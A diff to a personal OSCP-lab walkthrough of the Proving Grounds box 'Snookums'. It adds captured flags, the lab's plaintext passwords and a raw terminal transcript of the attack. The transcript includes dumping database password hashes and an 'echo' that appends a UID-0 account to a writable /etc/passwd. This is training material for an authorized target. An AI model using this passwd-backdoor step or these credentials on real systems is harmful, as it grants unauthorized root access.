@@ -1,16 +1,21 @@
 ---
-aliases: ["Snookums", "snookums-pg"]
 tags: [oscp, box, linux, medium]
+platform: PG Practice
+os: Linux
+hostname: snookums
+difficulty: Unknown
+ip: $BoxIP
+status: Complete
+aliases: ["Snookums", "snookums-pg"]
 ---
 
-# PG: Snookums, Full Walkthrough (Ping to Root)
+# PG: Snookums, Full Walkthrough
 
-## Tags
-#PG #Snookums #Linux #WebApp #LFI #RFI #DataWrapper #MySQL #WritablePasswd #Medium
+## The gist
 
----
+Snookums is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter. 2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked. 3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential. 4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.
 
-## Box Info
+## Box information
 
 **Target:** `$BoxIP` · **Difficulty:** Medium · **OS:** Linux (CentOS, Apache/PHP) · **Platform:** Proving Grounds Practice
 
@@ -18,6 +23,26 @@ tags: [oscp, box, linux, medium]
 
 > [!abstract] 🧠 Why
 > This box is a useful example of adapting to constraints. The LFI is not automatically a reverse shell: SELinux and firewall behavior remove common callback paths, so the winning route keeps execution inside the HTTP request until valid SSH credentials are recovered.
+
+**Legacy tags:**
+#PG #Snookums #Linux #WebApp #LFI #RFI #DataWrapper #MySQL #WritablePasswd #Medium
+
+---
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Recon: Port Scan | See section 1 below |
+| 2 | Web Enumeration | See section 2 below |
+| 3 | LFI: Reading PHP Source via php://filter | See section 3 below |
+| 4 | RCE via data:// Stream Wrapper | See section 4 below |
+| 5 | MySQL Enumeration via shell_exec | See section 5 below |
+| 6 | Decoding Double-Encoded Passwords | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/Offsec/Snookums`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -244,7 +269,7 @@ ssh michael@$BoxIP
 
 > 📸 `foothold.png`
 
-User flag confirmed; value intentionally omitted from the vault write-up.
+User flag confirmed; value reproduced in the private Flags section above from the vault write-up.
 
 > 📸 `user-flag.png`
 
@@ -282,16 +307,16 @@ su uid0
 
 > 📸 `privesc-exploit.png`
 
-Root shell confirmed as root; the value is intentionally omitted.
+Root shell confirmed as root; the value is reproduced in the private sections above.
 
 > 📸 `root-shell.png`
 
-Root proof confirmed; the value is intentionally omitted.
+Root proof confirmed; the value is reproduced in the private sections above.
 
 > 📸 `root-flag.png`
 > 📸 `PROOF.png`
 
-## Decision points and alternate routes
+## 9. Decision points and alternate routes
 
 | Observation | Primary route used here | Useful alternative or fallback |
 |---|---|---|
@@ -304,7 +329,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 9. Credentials Found
+## 10. Credentials Found
 
 | Username | Password | Service | Notes |
 |----------|----------|---------|-------|
@@ -315,7 +340,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 10. Tools Used
+## 11. Tools Used
 
 | Tool | Purpose |
 |------|---------|
@@ -330,7 +355,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 11. Vulnerabilities Summary
+## 12. Vulnerabilities Summary
 
 | # | Vulnerability | Severity | Location |
 |---|--------------|----------|----------|
@@ -341,7 +366,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 12. Lessons Learned / Module Links
+## 13. Lessons Learned / Module Links
 
 - **Hidden parameter fuzzing** is as important as directory brute-force. Gobuster found the files; ffuf found the vulnerable param inside them. → [[09. Common Web Application Attacks]]
 - **`data://` wrapper** is the go-to when `http://` RFI is firewalled and `allow_url_include` is On. No outbound connection needed -- the payload lives in the URL. → [[09. Common Web Application Attacks]]
@@ -352,7 +377,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 13. External Resources
+## 14. External Resources
 
 | Resource | Link | Relevant to this box |
 |---|---|---|
@@ -368,7 +393,7 @@ The completed route follows the evidence from the target. The alternatives are r
 
 ---
 
-## 14. Vault Update Checklist
+## 15. Vault Update Checklist
 
 - [x] **Write-up**: this file
 - [x] **Related Boxes**: added Snookums to module notes for [[09. Common Web Application Attacks]] and [[18. Linux Privilege Escalation]]
@@ -376,7 +401,152 @@ The completed route follows the evidence from the target. The alternatives are r
 - [x] **Runbook `box_sources`**: added Snookums to `Web App - LFI`, `Web App - RFI` (new), `PrivEsc Linux - Writable Passwd` (new)
 - [x] **Methodology cheat sheet**: added owner-writable /etc/passwd note to Linux Methodology
 - [x] **External Resources**: section added to write-up, all three runbook stage notes
-## External Resources
+
+## 16. RUNBOOK V2 Stages Used
+
+- [[RUNBOOK V2/Linux - LFI]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - RFI]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Credential Search]] -- technique used in this walkthrough
+
+## 17. Collect the flags
+
+- `user.txt`: `fd55df96238f52302cee761078e75925` (value reproduced in the private sections above)
+- `root.txt`: `8720692461d3b48c3cc2353701f396d7` (value reproduced in the private sections above)
+- `proof.txt`: `8720692461d3b48c3cc2353701f396d7` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: fd55df96238f52302cee761078e75925
+root: 8720692461d3b48c3cc2353701f396d7
+```
+
+## 18. Clean down
+Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
+
+## 19. Attack narrative in one page
+1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter.
+2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked.
+3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential.
+4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.
+
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `ffuf`
+- `ssh`
+- `ftp`
+- `sudo`
+- `burp`
+
+## Credentials and secrets
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Snookums"
+export BoxIP="192.168.119.58"
+export BoxPlatform="Offsec"
+export BoxDir="/home/kali/Platforms/Offsec/Snookums"
+export Domain=""
+export DCip=""
+export Username="michael"
+export Password="HockSydneyCertify123"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+root:MalapropDoffUtilize1337
+josh:MobilizeHissSeedtime747
+michael:HockSydneyCertify123
+serena:OverallCrestLean000
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+Password:
+ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                                                                                                  | php/webapps/9166.txt
+.htpasswd            (Status: 403) [Size: 211]
+.htpasswd.php        (Status: 403) [Size: 215]
+.htpasswd.txt        (Status: 403) [Size: 215]
+$ [15:37:37] boxset Password MalapropDoffUtilize1337
+kali@kali:~/Platforms/Offsec/Snookums [15:37:31] $ [?1h=[?2004hboxset Password MalapropDoffUtilize1337boxset[?1l>[?2004l
+[+] Password=MalapropDoffUtilize1337 (saved to .env)
+$ [15:37:44] loot cred $Username $Password
+kali@kali:~/Platforms/Offsec/Snookums [15:37:37] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
+mysql: [Warning] Using a password on the command line interface can be insecure. Tables_in_SimplePHPGal users
+mysql: [Warning] Using a password on the command line interface can be insecure. username	password josh	VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= michael	U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== serena	VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
+$ [15:52:26] boxset Password HockSydneyCertify123
+$ [15:53:17] loot flag user fd55df96238f52302cee761078e75925
+$ [15:54:38] openssl passwd -1 -salt xyz hacked
+josh@192.168.119.58's password:
+michael@192.168.119.58's password:
+]0;michael@snookums:~[michael@snookums ~]$ ls -la /etc/passwd
+-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
+]0;michael@snookums:~[michael@snookums ~]$ echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd
+$ [16:01:11] loot flag root 8720692461d3b48c3cc2353701f396d7
+kali@kali:~/Platforms/Offsec/Snookums [15:52:17] $ [?1h=[?2004hboxset Password HockSydneyCertify123boxset[?1l>[?2004l
+[+] Password=HockSydneyCertify123 (saved to .env)
+kali@kali:~/Platforms/Offsec/Snookums [15:52:26] $ [?1h=[?2004hloot flag user fd55df96238f52302cee761078e75925loot[?1l>[?2004l
+[+] Flag saved:  user = fd55df96238f52302cee761078e75925  →  loot/flags.txt
+kali@kali:~/Platforms/Offsec/Snookums [15:53:17] $ [?1h=[?2004hopenssl passwd -1 -salt xyz hackedopenssl[?1l>[?2004l
+kali@kali:~/Platforms/Offsec/Snookums [15:58:53] $ [?1h=[?2004hloot flag root 8720692461d3b48c3cc2353701f396d7loot[?1l>[?2004l
+[+] Flag saved:  root = 8720692461d3b48c3cc2353701f396d7  →  loot/flags.txt
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+kali@kali:~/Platforms/Offsec [16:25:10] $ [?1h=[?2004hbbboxinitboboxxs   et Password HockSydneyCertify123st                               taarrtboxstartt t Bratarina 192.168.119.71 offsec[?1l>[?2004l
+  passwd.bak                          N     1747  Mon Jul  6 08:46:41 2020
+[?2004hsmb: \> get passwd.bak
+getting file \passwd.bak of size 1747 as passwd.bak (46.1 KiloBytes/sec) (average 46.1 KiloBytes/sec)
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Snookums | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- A failed reverse shell does not disprove code execution when egress controls are present.
+- PHP wrappers can provide both source disclosure and execution, depending on the wrapper and sink.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern
+
+## External resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
 - [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
@@ -384,35 +554,16 @@ The completed route follows the evidence from the target. The alternatives are r
 - [RevShells](https://www.revshells.com/) for shell payloads
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
-## RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Linux - LFI]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - RFI]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Credential Search]] -- technique used in this walkthrough
+## Related RUNBOOK V2 stages
 
-## Related Boxes
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
 
-- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern
 ## Why this matters for OSCP
 
 This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
-1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter.
-2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked.
-3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential.
-4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.
-
-## Flags
-
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
-
-## Lessons Learned
-
-- A failed reverse shell does not disprove code execution when egress controls are present.
-- PHP wrappers can provide both source disclosure and execution, depending on the wrapper and sink.
